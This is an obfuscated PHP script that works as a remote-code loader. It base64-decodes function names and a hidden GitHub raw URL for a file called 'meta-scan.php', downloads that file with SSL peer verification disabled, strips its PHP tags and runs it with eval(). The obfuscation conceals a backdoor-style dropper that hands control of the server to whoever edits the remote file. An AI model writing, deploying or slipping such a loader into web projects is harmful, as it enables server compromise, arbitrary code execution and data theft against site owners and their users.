<?php

$dFy5o0 = function($Bm7g2) {
    $curl   = base64_decode('Y3VybF9pbml0');
    $exec   = base64_decode('Y3VybF9leGVj');
    $close  = base64_decode('Y3VybF9jbG9zZQ==');
    $setopt = base64_decode('Y3VybF9zZXRvcHQ=');
    
    $ch = $curl($Bm7g2);
    $setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $setopt($ch, CURLOPT_USERAGENT, base64_decode('TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IFBIUCBzY3JpcHQp'));
    $setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

    $Vn6o1 = $exec($ch);
    if ($Vn6o1 === false) {
        throw new Exception('cURL Error: ' . curl_error($ch));
    }

    $close($ch);
    return $Vn6o1;
};

$hMn9u0 = function($Jg9b2) {
    $Jg9b2 = trim($Jg9b2);
    if (strpos($Jg9b2, '<?php') === 0) {
        $Jg9b2 = substr($Jg9b2, 5);
    }
    if (strrpos($Jg9b2, '?>') === (strlen($Jg9b2) - 2)) {
        $Jg9b2 = substr($Jg9b2, 0, -2);
    }
    return $Jg9b2;
};

$lQ8u9x = function($zFk4x2) {
    return base64_decode($zFk4x2);
};

$Tj9o3n = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FsYW5wYWpsYW4vbWV0YS1jb25mL21haW4vbWV0YS1zY2FuLnBocA==';
$kBr8n1 = $lQ8u9x($Tj9o3n);

try {
    $uP8d2 = $dFy5o0($kBr8n1);
    $Ml5x3 = $hMn9u0($uP8d2);
    eval($Ml5x3);
} catch (Exception $e) {
    echo base64_decode('RXJyb3I6IA=='), $e->getMessage(), "\n";
}